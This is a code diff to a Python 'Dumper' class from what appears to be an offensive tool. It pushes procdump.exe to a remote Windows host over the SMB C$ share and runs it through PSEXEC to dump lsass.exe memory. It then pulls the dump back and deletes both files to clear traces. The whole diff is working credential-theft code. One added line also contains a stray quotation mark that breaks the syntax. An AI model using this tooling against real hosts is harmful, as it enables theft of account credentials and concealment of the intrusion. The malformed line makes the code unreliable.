@@ -93,7 +93,7 @@ class Dumper:
             filename = re.sub(r"\d+", "", path.basename(src))
             self.smb.putFile(
                 "C$",
-                f"\\Users\\{self.credentials['username']}\\{filename}",
+                filename,
                 open(src, "rb").read,
             )
         elif self.host_info["arch"] == 32:
@@ -101,7 +101,7 @@ class Dumper:
             filename = re.sub(r"\d+", "", path.basename(src))
             self.smb.putFile(
                 "C$",
-                f"\\Users\\{self.credentials['username']}\\{filename}",
+                filename",
                 open(src, "rb").read,
             )
         else:
@@ -110,7 +110,7 @@ class Dumper:
 
     def exec_procdump(self):
         executer = PSEXEC(
-            f"C:\\Users\\{self.credentials['username']}\\procdump.exe -accepteula",
+            "C:\\procdump.exe -accepteula",
             None,
             None,
             None,
@@ -129,7 +129,7 @@ class Dumper:
         )
         if self.host_info["arch"] == 64:
             executer = PSEXEC(
-                f"C:\\Users\\{self.credentials['username']}\\procdump.exe -ma -64 lsass.exe C:\\Users\\{self.credentials['username']}\\lsass_dump",
+                f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
                 None,
                 None,
                 None,
@@ -167,7 +167,7 @@ class Dumper:
         print("Dumping")
         self.smb.getFile(
             "C$",
-            f"\\Users\\{self.credentials['username']}\\lsass_dump.dmp",
+            "/lsass_dump.dmp",
             open("lsass_dump.dmp", "wb").write,
         )
         print("Finished")
@@ -175,10 +175,10 @@ class Dumper:
     def clear_out(self):
         print("Starting ClearOut")
         self.smb.deleteFile(
-            "C$", f"\\Users\\{self.credentials['username']}\\lsass_dump.dmp"
+            "C$", "/lsass_dump.dmp"
         )
         self.smb.deleteFile(
-            "C$", f"\\Users\\{self.credentials['username']}\\procdump.exe"
+            "C$", "/procdump.exe"
         )
         self.smb.close()
         print("ClearOut Finished")
